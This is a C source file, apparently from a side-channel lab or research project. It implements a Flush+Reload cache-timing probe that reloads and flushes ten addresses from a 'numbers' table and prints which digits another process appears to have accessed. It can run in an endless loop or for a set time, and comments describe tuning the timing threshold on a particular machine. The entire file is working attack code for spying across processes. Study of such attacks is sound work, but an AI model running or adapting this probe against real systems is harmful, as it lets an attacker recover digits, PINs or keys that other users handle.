#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "probe.h"


//This threshold is on machine B and works well with test 1 running but doesn't seem
//to pick up accesses from web or single accesses
const int THRESHOLD = 420;
const float WAIT_SECONDS = 1.0f;
const int TO_MICROSECONDS = 1000000;

void autoprobe_func() {
    
    int digits[50];
    int accessed = 0;

    for (int nmbr = 1; nmbr < 11; ++nmbr) {

        int t = reload((char*) numbers[nmbr]);
    
        if(t < THRESHOLD){
            digits[accessed] = nmbr - 1;
            ++accessed;
            if(accessed == 50)
                break;
            // printf("%d Accessed %d\n", nmbr - 1, t);
        }
        // else{
        //     printf("%d Miss %d\n", nmbr - 1, t);
        // }
        usleep(1);
    }
    if(accessed > 0){
        printf("accessed digits: ");
        for (int i = 0; i < accessed; ++i) {
            printf("%d ", digits[i]);
        }
    
        printf("\n");
    }
}

int main(int argc, char **argv) {
    int digits[50];
    int t = 0;
    time_t end;

    if(argc > 1){
        sscanf(argv[1], "%d", &t);
    }

    if(t <= 0) {
        while(1) {
            autoprobe_func();
            for (int nmbr = 1; nmbr < 11; ++nmbr) 
                flush(numbers[nmbr]);
            
            usleep(WAIT_SECONDS*TO_MICROSECONDS);
            
        }
    }else {
        end = time(NULL) + t;
        printf("start: %ld\n", end-t);
        while(time(NULL) < end) {
            autoprobe_func();
            for (int nmbr = 1; nmbr < 11; ++nmbr) 
                flush(numbers[nmbr]);
            
            usleep(WAIT_SECONDS*TO_MICROSECONDS);
        }
        printf("Expected End: %ld, Actual End:%ld \n", end, time(NULL));
    }

    return 0;
}